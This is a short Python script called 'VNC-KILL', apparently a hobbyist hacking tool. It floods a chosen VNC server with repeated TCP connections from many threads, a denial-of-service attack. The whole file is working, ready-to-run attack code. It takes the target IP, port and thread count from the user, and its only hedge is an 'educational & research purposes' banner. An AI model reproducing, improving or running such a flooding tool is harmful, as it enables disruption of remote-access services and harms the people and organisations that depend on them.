import socket
import threading
import time
import random
import pyfiglet
import os
from termcolor import colored
from colorama import Fore
os.system("clear")
Banner=pyfiglet.figlet_format("VNC-KILL")
banner=colored(Banner,"red")
print(banner)
print(Fore.YELLOW+"          ..:: Made by Aryan Giri ::..")
print(Fore.YELLOW+"  ⚠ This tool is only made for educational & research purposes⚠")
print()
def dos_vnc(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b'ARYSEC_Bomb')
            sock.close()
            print(Fore.GREEN+f"Sent data to {target_ip}:{target_port}")
        except:
            print(Fore.RED+f"Failed to attack on  {target_ip}:{target_port}")

def main():
    target_ip = input(Fore.GREEN+"Enter the target IP address: ")
    target_port = int(input(Fore.GREEN+"Enter the target port: "))
    num_threads = int(input(Fore.GREEN+"Enter the number of threads: "))

    print(f"Starting VNC DOS attack on {target_ip}:{target_port} with {num_threads} threads...")

    for _ in range(num_threads):
        thread = threading.Thread(target=dos_vnc, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    main()
